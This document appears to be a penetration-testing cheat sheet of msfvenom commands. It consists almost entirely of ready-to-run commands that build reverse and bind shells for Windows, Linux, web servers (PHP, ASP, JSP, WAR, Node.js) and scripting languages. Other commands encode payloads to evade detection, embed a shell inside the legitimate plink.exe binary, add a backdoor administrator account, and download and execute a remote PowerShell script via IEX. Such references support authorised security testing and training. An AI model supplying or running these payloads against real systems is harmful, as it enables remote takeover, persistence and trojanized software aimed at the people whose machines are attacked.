MSFVenom Cheatsheet
*********************

Listing
########

Payload

.. code-block:: console

	msvenom -l 

Encoders

.. code-block:: console

	msfvenom -l encoders

Common params when creating a shellcode
##########################################

.. code-block:: console

	-b "\x00\x0a\x0d"
	-f c
	-e x86/shikata_ga_nai -i 5
	EXITFUNC=thread
	PrependSetuid=True #Use this to create a shellcode that will execute something with SUID

Windows
#########

Reverse Shell

.. code-block:: console

	msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe

Bind Shell

.. code-block:: console

	msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe

Create User

.. code-block:: console

	msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe

CMD Shell

.. code-block:: console

	msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
        
.. code-block:: console

        msfvenom -p windows/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe

Execute Command

.. code-block:: console

	msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
	msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe

Encoder

.. code-block:: console

	msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe

Embedded inside executable

.. code-block:: console

	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe

Linux Payloads
################

Reverse Shell

.. code-block:: console

	msfvenom -p linux/x86//meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
	msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf

Bind Shell

.. code-block:: console

	msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf

Web Based Payloads
####################

PHP - Reverse Shell

.. code-block:: console

	msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
	cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASP/x -- Reverse Shell

.. code-block:: console

	msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx

JSP - Reverse shell

.. code-block:: console

	msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp

WAR - Reverse shell

.. code-block:: console

	msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war

NODEJS - Reverse Shell

.. code-block:: console

	msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)

Script Language payloads
##########################

Perl

.. code-block:: console

	msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl

python

.. code-block:: console

	msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py

Bash

.. code-block:: console

	msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
